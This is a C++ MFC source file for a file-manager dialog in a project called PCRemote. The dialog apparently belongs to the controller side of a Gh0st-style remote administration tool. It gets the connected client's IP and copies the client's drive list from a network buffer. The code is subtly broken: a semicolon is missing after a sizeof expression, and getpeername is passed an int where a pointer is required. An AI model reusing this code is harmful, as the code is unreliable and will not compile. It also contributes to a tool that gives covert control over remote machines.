// FileManagerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PCRemote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "FileTransferModeDlg.h"
#include "..\common\macros.h"

// CFileManagerDlg 对话框

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CFileManagerDlg::IDD, pParent)
{
	SHFILEINFO sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = sfi.hIcon;

	HIMAGELIST hImageList;	//加载系统图标列表
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);


	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	sockaddr_in sockAddr;
	int nSockAddrLen = sizeof(sockaddr_in)
	memset(&sockAddr, 0, nSockAddrLen);

	//得到连接客户端的IP
	int nResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, nSockAddrLen);
	m_IPAddress = (nResult != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";

	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, 
		   m_pContext->m_DeCompressionBuffer.GetBuffer(1), 
		   m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;




}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
END_MESSAGE_MAP()


// CFileManagerDlg 消息处理程序


BOOL CFileManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}
